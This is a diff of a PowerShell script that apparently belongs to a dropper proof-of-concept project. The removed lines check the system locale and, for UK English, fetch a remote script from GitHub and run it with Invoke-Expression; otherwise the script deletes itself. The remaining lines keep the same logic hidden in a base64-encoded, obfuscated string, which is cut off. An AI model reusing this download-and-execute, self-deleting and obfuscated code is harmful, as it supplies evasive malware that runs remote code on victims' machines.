@@ -1,12 +1,7 @@
 $hostinfo = Get-Host
 $lang = $hostinfo.CurrentCulture.DisplayName
 
-if ($lang = "English (United Kingdom)") {
-$downloader = New-Object System.Net.Webclient
-$downloadedscript = $downloader.DownloadString("https://raw.githubusercontent.com/tww-software/powershell-dropper-POC/master/downloadandexecute.ps1")
-Invoke-Expression $downloadedscript
-} else { 
-Remove-Item $PSCommandPath }
+
 
 $t1 = "JAAxADIAMwAxACAAPQAgAEcAZQBUAC0ASABvAHMAdAA7ACAAJAA0ADIAMgAxACAAPQAgACQAMQAyADMAMQAuAEMAdQByAHIAZQBuAHQAQwB1AGwAdAB1AHIAZQAuAEQAaQBzAHAAbABhAHkATgBhAG0AZQA7ACAAJAA0ADUANgAgAD0AIAAiAGcAZQBhAGMAdABhAGgAZQAzADIANgBnAGYAcwBzAGEAdgByADMAMgAxACIAOwAgACQANwA4ADkAIA
 A9ACAAIgBCAFAAQQBFAE0AQQBMAHcAQgB0AEEARwBFAEEAIgA7ACAAJAA2ADcANQAgAD0AIAAiACkAbQBvAGQAZwBuAGkASwAgAGQAZQB0AGkAbgBVACgAIABoAHMAaQBsAGcAbgBFACIAOwAgAGkAZgAgACgAJAA0ADIAMgAxACAAPQAgACgAWwByAGUAZwBlAHgAXQA6ADoATQBhAHQAYwBoAGUAcwAoACQANgA3ADUALAAnAC4AJwAsACcAUgBp
